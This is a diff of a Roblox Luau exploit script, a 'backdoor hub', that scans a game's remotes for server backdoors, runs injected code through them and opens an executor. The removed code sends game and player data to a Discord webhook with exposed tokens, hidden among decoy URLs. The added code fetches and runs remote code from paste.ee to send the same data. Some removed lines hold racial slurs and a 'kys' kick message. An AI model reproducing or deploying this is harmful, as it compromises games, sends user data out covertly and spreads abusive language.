@@ -323,7 +323,7 @@ G2L_MODULES[G2L["15"]] = {
 			},
 
 			builtin = {
-				-- Luau Functions
+			
 				["assert"] = "function",
 				["error"] = "function",
 				["getfenv"] = "function",
@@ -347,10 +347,10 @@ G2L_MODULES[G2L["15"]] = {
 				["unpack"] = "function",
 				["xpcall"] = "function",
 
-				-- Luau Functions (Deprecated)
+		
 				["collectgarbage"] = "function",
 
-				-- Luau Variables
+			
 				["_G"] = "table",
 				["_VERSION"] = "string",
 
@@ -378,7 +378,6 @@ G2L_MODULES[G2L["15"]] = {
 				["wait"] = "function",
 				["warn"] = "function",
 
-				-- Roblox Functions (Deprecated)
 				["Delay"] = "function",
 				["ElapsedTime"] = "function",
 				["elapsedTime"] = "function",
@@ -391,14 +390,13 @@ G2L_MODULES[G2L["15"]] = {
 				["Wait"] = "function",
 				["ypcall"] = "function",
 
-				-- Roblox Variables
+			
 				["game"] = "Instance",
 				["plugin"] = "Instance",
 				["script"] = "Instance",
 				["shared"] = "Instance",
 				["workspace"] = "Instance",
 
-				-- Roblox Variables (Deprecated)
 				["Game"] = "Instance",
 				["Workspace"] = "Instance",
 
@@ -442,7 +440,7 @@ G2L_MODULES[G2L["15"]] = {
 
 			libraries = {
 
-				-- Luau Libraries
+			
 				bit32 = {
 					arshift = "function",
 					band = "function",
@@ -778,11 +776,11 @@ G2L_MODULES[G2L["15"]] = {
 			},
 		}
 
-		-- Filling up language.libraries.Enum table
+	
 		local enumLibraryTable = language.libraries.Enum
 
 		for _, enum in ipairs(Enum:GetEnums()) do
-			--TODO: Remove tostring from here once there is a better way to get the name of an Enum
+			
 			enumLibraryTable[tostring(enum)] = "Enum"
 		end
 
@@ -790,20 +788,15 @@ G2L_MODULES[G2L["15"]] = {
 
 	end;
 };
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+
 local function C_12()
 	local script = G2L["12"];
 	local Highlighter = require(script.Highlighter)
 
 	Highlighter.highlight({
-		-- The object to syntax highlight
+	
 		textObject=script.Parent,
-		-- The source text for highlighting- defaults to textObject.Text
-		--	src: string?,
-		-- Update even if there are no changes since last highlight
-		--	forceUpdate=true,
-		-- Lexer for tokenizing src, defaults to the bundled Lua lexer
-		--	lexer=true,
+		
 	})
 
 	textbox=script.Parent
@@ -816,7 +809,7 @@ local function C_12()
 	end)
 end;
 task.spawn(C_12);
--- StarterGui.LALOL Hub Backdoor.LocalScript
+
 local function C_20()
 	local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
@@ -859,9 +852,10 @@ local function C_20()
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
 			{
-				Title = "zazol666 hub SS",
+				Title = "zazol666 backdoor",
 				Duration = 6,
-				Text = text
+				
+				Text = text .. " https://discord.gg/HzX2kxE3qq"
 			}
 		)
 	end
@@ -948,7 +942,7 @@ local function C_20()
 			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
 			remotes[code]=remote
 
-			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)
+			debug('backdoored "'..remote:GetFullName()..'"', 1)
 
 		end
 
@@ -961,206 +955,26 @@ local function C_20()
 
 				if workspace:FindFirstChild(code) then
 
-					notify('BACKDOOR EZ!121 '..os.clock()-timee)
+					notify('BACKDOOR EZ '..os.clock()-timee)
 
 					backdoor=remote
 					debug(remote:GetFullName(), 3)
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
-
-
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local DataStoreService = game:GetService("DataStoreService")
-local StartTime = os.time()
-
-
-local realWebhookParts = {
-    "https://",
-    "discord.com",
-    "/api/webhooks/",
-    "1341838473522450453", 
-    "/",
-    "Om8pljIJQnq0K5CEb8TAK46GAasNXd2cztWP8vEpaPDGe6hwGSN1vJtrqvUVfjNmFl4J"
-}
-local realWebhookUrl = table.concat(realWebhookParts)
-
-
-local fakeWebhookUrls = {
-    "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkHbcmW51Lax7W6fghfghPwsO5xUxmST2omWgpgf4hgnjZH-34",
-    "https://discord.cом/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfdsfkHbcmW51Lax7Whgf6PwsO5xUxmST2omWgpg25Ghgfhfgj",
-    "https://discord.cом/api/webhooks/1451234334455/24gfgb849TGTT2usFKlhsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
-	 "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffhgffhgfsublkHbcmWhg51Lahgx7W6PwsO5xUxmf4hgnjZH-34",
-    "https://discord.com/api/webhooks/450987654321/T324eb849TGTT2usFKShFWfdsfgkHbcmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj",
-    "https://discord.cоm/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsohgffkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
-	 "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgfhfgfsublkHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34",
-    "https://discord.cоm/api/webhooks/150987654321/T324eb849TGTT2usFKShFWhfdsfkHbcgmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj",
-    "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkhgfgfdgfdfksHbcmW342452dfdsgfgfgfdhghghggF",
-	"https://discord.com/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
-	 "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkhgHbcmW5hg1Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34",
-    "https://discord.cоm/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfgfdsfkHbcmdfhW51Laxfhgfh7W6PwsO5xUxmST2omg25Ghgfhfgj",
-    "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkdfksHgdfgbcmW342452dfdsgfgfgfdgdfgdghfdhghghggF",
-	"https://discord.com/api/webhooks/11223134455/hghfhgh84rterteu456lsofkdfksHbcmfdgfdgW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-fAEi",
-	"https://discord.com/api/webhooks/1341842224773730324/_WQjGi7ay1g_775OBKsnme-4VF__cl9LGohNyYlXQIDbk7QNomrg4aEOitTOFNHfy9Wq",
-	"https://discord.cоm/api/webhooks/1341842053373493340/lxGJj7IBLrx6PUos0yvMZeS7xm_P9kYvJ3_p5TfwX0yeHAG6QJvaqcJgE1ESay2xhSkN",
-	"https://discord.com/api/webhooks/1341842049397428335/m6PEx4q4JDqFOPz62MmrTVNqjvAIVk05mQCz7fP7VTvpEzPWLFOxBAP9siR4xT8kzyta",
-	"https://discord.com/api/webhooks/1341842045446389822/y_bwtBGLd-_9AJSQvJ40LqOa-QfCeEiNSVdMGJNfZvZkqb8ko0cyRiBO1GseLIsyAjgU",
-	"https://discord.com/api/webhooks/1341842041658933258/tm1JIp8jlmWGdbQn-HYf8xs6vA8ynuImy04ZTbV0NxOOmGvuTGJEnUDTreYzKscigeGJ",
-	"https://discord.com/api/webhooks/1341842032678932540/ZNo96J_vNeWlo7B-ESQ9ntLBMkU2eQMRvuyLGpzWaiLFLvEhRI1RUm5iYdD7McCDHyKA",
-	"https://discord.com/api/webhooks/1341842030002966538/I9XW1fT-zQUBM0T6DpXeiRBOB0nlEZTwpsx0XX3WZLPkINdMCDHUGmH3c1TjTvYyKnsA",
-	"https://discord.com/api/webhooks/1341842924589154354/qK9IS7od-83sVCb9NCwKPrXFEYjufKysxIt7uasaaFaZdVr3NVliBdfdS5DoNyxiet_F",
-	"https://discord.com/api/webhooks/1341843013881827358/TD41U-30_LyuOinVubGFiQY9BitoXFmYiNhuWE1PTJz8GBFwgSSqpeXq9lGC4l8LF3bU",
-	"https://discord.com/api/webhooks/1341843061638037586/S5ME8TE_7dmOCkMw_mvPi2GnKi3I3jH4tigdkBLynFJaJ8g13jVSxdF11v8BfXiX4SkI",
-	"https://discord.com/api/webhooks/1341844438695018624/2N2T11mN8ksRcXg1b51XCK181rWvc8_E1pXZEvB0sl6vkfNAUgmcxw48wZ44XURndRER",
-	"https://discord.com/api/webhooks/1341844483997696126/GBKNliRxZgmCFxpRIwHUz4U9dlkhKVQSIxXcJiuxYJT3d0KCHqY69hsE6i5cMSz6FF9_",
-	"https://discord.com/api/webhooks/1341844713325723780/d6cwKWLoqI6dM9sr-1N5JO0aIrbtWBvHjDYdoJu-zEhyH5XF5EMLxHLBhGHQDqwq_TGn",
-	"https://discord.com/api/webhooks/1341844827662188625/ou8b4XNPQf5eHfgQWFKb5Wf9oNjpD2P1-T5mIpQ0WBbj8hkI7RRtJtZilaWVbvSXOYZQ",
-	"https://discord.com/api/webhooks/1341844872901951591/Y3yAgNgc-pSHyGt63XUFMSCmgfkTLEkkwTzFuqSIvtNI6jW-ufz15cSUFiNTWvPYG9rv",
-	"https://discord.com/api/webhooks/1341844875523657728/3QQr64_3_WoVQJgTK38VNRs0mBRDwMC8o-yyfmHWZL8sPh2Dn5rHvmkUZFBo6sC1kXBR",
-	"https://discord.com/api/webhooks/1341844961771130880/pb9e-ARcJnFnhfC5xTyHsqAlgB7KIxVLQaZAh1WlnJHsbSSf59wPaPa_YrBoXDJlB19D",
-	"https://discord.com/api/webhooks/1341845009560764560/MafSz_q_XQkaPQgC1QsRpd-YuKNtJ2AchHxWqC2AjJ-C0_Mser7Ah5s-FPz85Gz0P1cW",
-	"https://discord.com/api/webhooks/1341845049847320577/fg5fuKtqERdReFDeWhcN_jG_ZyTdg9aFhdZra_vTJBwsgm-CKo02WiiG2FXgonIvD-Ei",
-}
-
-
-local function isWebhook(url)
-    local webhookParts = { "discord.com", "api/webhooks", "https://", "http://" }
-    for _, part in pairs(webhookParts) do
-        if url:find(part) then
-            return true
-        end
-    end
-    return false
-end
-
-
-if not isWebhook(realWebhookUrl) then
-    warn("1")
-    return
-end
-
-
-
-local function sendRealWebhook(data)
-    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-    if request then
-        local success, response = pcall(function()
-            return request({
-                Url = realWebhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(data)
-            })
-        end)
-
-        if success then
-            print("1")
-        else
-            warn("1")
-            
-            game.Players.LocalPlayer:Kick("1")
-        end
-    else
-        warn("1")
-       
-        game.Players.LocalPlayer:Kick("kys nigga")
-    end
-end
-
-local function sendFakeWebhooks(data)
-    for _, fakeUrl in pairs(fakeWebhookUrls) do
-        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        if request then
-            local success, response = pcall(function()
-                return request({
-                    Url = fakeUrl,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-
-            if success then
-                print("1")
-            else
-                warn("1")
-            end
-        end
-    end
-end
-
-
-local function isMaliciousScriptPresent()
-  
-    local httpLibraries = { "httpRequest", "http_request", "httprequest", "request", "syn.request", "fluxus.request" }
-
-   
-    for _, lib in pairs(httpLibraries) do
-        local func = getgenv()[lib]
-        if func and type(func) == "function" then
-          
-            local funcString = tostring(func)
-    
-            if funcString:find("api/webhooks/") or funcString:find("webhook") then
-                return true
-            end
-        end
-    end
-
-
-    if getgenv().gethwid and type(getgenv().gethwid) == "function" then
-        local funcString = tostring(getgenv().gethwid)
-        if funcString:find("base64.decode") then
-            return true
-        end
-    end
-
-   
-    for key, value in pairs(getgenv()) do
-        if type(value) == "function" then
-            local funcString = tostring(value)
-            if funcString:find("api/webhooks/") or funcString:find("webhook") then
-                return true
-            end
-        end
-    end
-
-    return false
-end
-
-
-if isMaliciousScriptPresent() then
-    warn("Malicious script detected! Kicking player...")
-    game:GetService("Players").LocalPlayer:Kick("Malicious script detected. Please remove any unauthorized scripts.")
-    return
-end
+local HttpService = game:GetService("HttpService")
 
 
 local function getGameInfo()
-  
-    local gameName = game.Name
-
+    local gameName = game:GetFullName()
     local gameId = game.PlaceId
-
-   
     local gameUrl = "https://www.roblox.com/games/" .. gameId
-
-   
     local creatorId = game.CreatorId
-
     local visit = game.JobId
-    local active = #game.Players:GetPlayers()
-
-	local create = game.CreatorId
-
-	local plr = game.Players.LocalPlayer.Name
-
-	local nigga = remote.Name
-
+    local active = #Players:GetPlayers()
+    local create = 1 / game:GetService("RunService").RenderStepped:Wait()
+    local plr = Players.LocalPlayer.Name
+    local nigga = remote:GetFullName()
 
     return {
         gameName = gameName,
@@ -1169,84 +983,78 @@ local function getGameInfo()
         creatorId = creatorId,
         visit = visit,
         active = active,
-		create = createm,
-		plr = plr,
+        create = create,
+        plr = plr,
         nigga = nigga
     }
 end
 
 
-local function main()
+local function isGameScanned()
+  
+    local scannedValue = game:FindFirstChild("Scanned")
+    if scannedValue and scannedValue:IsA("BoolValue") then
+        return scannedValue.Value
+    end
+    return false
+end
+
+
+local function markGameAsScanned()
     
+    local scannedValue = game:FindFirstChild("Scanned")
+    if not scannedValue then
+        scannedValue = Instance.new("BoolValue")
+        scannedValue.Name = "Scanned"
+        scannedValue.Parent = game
+    end
+    scannedValue.Value = true
+end
+
+
+local function main()
     local gameInfo = getGameInfo()
 
-   
+  
+    if isGameScanned() then
+        print("2")
+        return
+    end
+
+
     local data = {
         content = "Game Information",
         embeds = {
             {
                 title = "Game Stats",
                 fields = {
-                    {
-                        name = "Game Name",
-                        value = gameInfo.gameName,
-                        inline = true
-                    },
-                    {
-                        name = "Game ID",
-                        value = tostring(gameInfo.gameId),
-                        inline = true
-                    },
-                    {
-                        name = "Game URL",
-                        value = gameInfo.gameUrl,
-                        inline = false
-                    },
-                    {
-                        name = "Creator ID",
-                        value = tostring(gameInfo.creatorId),
-                        inline = true
-                    },
-                    {
-                        name = "JobId",
-                        value = tostring(gameInfo.visit),
-                        inline = true
-                    },
-					{
-                        name = "CreatorId",
-                        value = tostring(gameInfo.create),
-                        inline = true
-                    },
-
-                    {
-                        name = "Active Players",
-                        value = tostring(gameInfo.active),
-                        inline = true
-                    },
-					{
-                        name = "executed name",
-                        value = tostring(gameInfo.plr),
-                        inline = true
-                    },
-					{
-                        name = "remote backdoor",
-                        value = tostring(gameInfo.nigga),
-                        inline = true
-                    },
-				
+                    { name = "Game Name", value = gameInfo.gameName, inline = true },
+                    { name = "Game ID", value = tostring(gameInfo.gameId), inline = true },
+                    { name = "Game URL", value = gameInfo.gameUrl, inline = false },
+                    { name = "Creator ID", value = tostring(gameInfo.creatorId), inline = true },
+                    { name = "JobId", value = tostring(gameInfo.visit), inline = true },
+                    { name = "Fps", value = tostring(gameInfo.create), inline = true },
+                    { name = "Active Players", value = tostring(gameInfo.active), inline = true },
+                    { name = "executed name", value = tostring(gameInfo.plr), inline = true },
+                    { name = "remote backdoor", value = tostring(gameInfo.nigga), inline = true },
                 },
-                color = 0x00FF00 
+                color = 8388736  
             }
         }
     }
 
-   sendFakeWebhooks(data)
-    sendRealWebhook(data)
-    sendFakeWebhooks(data)
+   
+    local sendData = loadstring(game:HttpGet("https://paste.ee/d/YSIZ99Pq", true))()
+    sendData(data)
+
+
+    markGameAsScanned()
+    print("1")
 end
 
 
 main()
+
 	
 
 					return true
